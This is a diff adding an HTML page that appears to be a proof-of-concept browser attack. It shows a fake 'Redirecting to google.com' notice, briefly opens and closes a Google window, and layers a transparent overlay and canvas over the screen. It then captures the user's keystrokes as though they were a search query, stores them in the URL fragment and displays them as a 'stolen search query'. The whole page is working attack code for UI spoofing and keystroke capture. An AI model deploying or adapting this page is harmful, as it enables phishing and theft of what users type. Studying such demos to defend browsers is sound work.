@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+</body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <style>
+        body,
+        canvas {
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+
+        }
+
+        span {
+            position: absolute;
+            left: 1%;
+            top: 1%;
+        }
+
+        canvas {
+            z-index: 1;
+            display: none;
+        }
+
+        .faketext {
+            position: absolute;
+            left: 50%;
+            top: 35%;
+            z-index: 1000;
+            transform: translate(-50%, 120%);
+            width: 25%;
+            height: 4%;
+            font-family: Roboto, arial, sans-serif;
+            font-size: 16px;
+            color: #fff;
+            background: transparent;
+            border: none;
+        }
+    </style>
+    <canvas></canvas>
+    <span class='bait'>Redirecting to https://google.com... If it takes long, <a href="https://google.com">click
+            here</a></span>
+    <span class='faketext'></span>
+    <script>
+        var drawing = false
+        var canvas = document.querySelector('canvas')
+        ctx = canvas.getContext('2d', { alpha: false })
+        canvas.width = document.body.clientWidth
+        canvas.height = document.body.clientHeight
+        ctx.font = '16px Roboto,arial,sans-serif'
+        var my, mx = 0;
+        document.body.onmousemove = function (e) {
+            mx = e.clientX
+            my = e.clientY
+        }
+        document.addEventListener('visibilitychange', e => {
+            if (document.visibilityState !== 'visible') {
+                if (!drawing && window.location.href.indexOf('#') == -1) {
+                    setInterval(function () {
+                        ctx.clearRect(0, 0, canvas.width, canvas.height)
+                    }, 1000 / 60)
+                    canvas.style.display = 'inline-block'
+
+                    drawing = true
+                }
+            }
+
+            if (window.location.href.indexOf('#') != -1) {
+                document.body.textContent = 'stolen search query: ' + window.location.href.split('#').slice(1).join('#')
+            }
+        })
+        document.querySelector('a').onclick = function (e) {
+            e.preventDefault()
+            grab('https://google.com')
+        }
+        document.body.onkeydown = function (e) {
+            var a = document.querySelector('.faketext')
+            if (e.key == 'Enter') {
+                window.location.replace(window.location.href + '#' + encodeURIComponent(a.textContent))
+            } else {
+                a.textContent += e.key
+            }
+        }
+        function grab(url) {
+            var w = window.open(url);
+            setTimeout(function () {
+                w.close()
+            }, 500)
+        }
+
+    </script>
+</body>
+
+</html>
